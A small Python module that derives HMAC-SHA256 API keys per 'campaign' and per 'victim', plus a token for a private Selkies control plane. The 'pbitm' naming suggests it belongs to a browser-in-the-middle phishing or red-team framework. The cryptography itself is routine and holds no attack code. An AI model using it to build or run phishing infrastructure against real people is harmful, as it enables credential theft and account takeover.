"""Derive scoped service credentials without persisting one key per campaign."""

import base64
import hashlib
import hmac


def derive_campaign_api_key(master_key: str, campaign_id: str) -> str:
    if not master_key or not campaign_id:
        raise ValueError("master_key and campaign_id are required")

    digest = hmac.new(
        master_key.encode("utf-8"),
        f"pbitm:campaign:{campaign_id}".encode("utf-8"),
        hashlib.sha256,
    ).digest()
    return base64.urlsafe_b64encode(digest).rstrip(b"=").decode("ascii")


def derive_victim_api_key(campaign_key: str, victim_id: str) -> str:
    if not campaign_key or not victim_id:
        raise ValueError("campaign_key and victim_id are required")

    digest = hmac.new(
        campaign_key.encode("utf-8"),
        f"pbitm:victim:{victim_id}".encode("utf-8"),
        hashlib.sha256,
    ).digest()
    return base64.urlsafe_b64encode(digest).rstrip(b"=").decode("ascii")


def derive_selkies_master_token(campaign_key: str, victim_id: str) -> str:
    """Derive a credential used only by the private Selkies control plane."""
    if not campaign_key or not victim_id:
        raise ValueError("campaign_key and victim_id are required")

    digest = hmac.new(
        campaign_key.encode("utf-8"),
        f"pbitm:selkies-control:{victim_id}".encode("utf-8"),
        hashlib.sha256,
    ).digest()
    return base64.urlsafe_b64encode(digest).rstrip(b"=").decode("ascii")
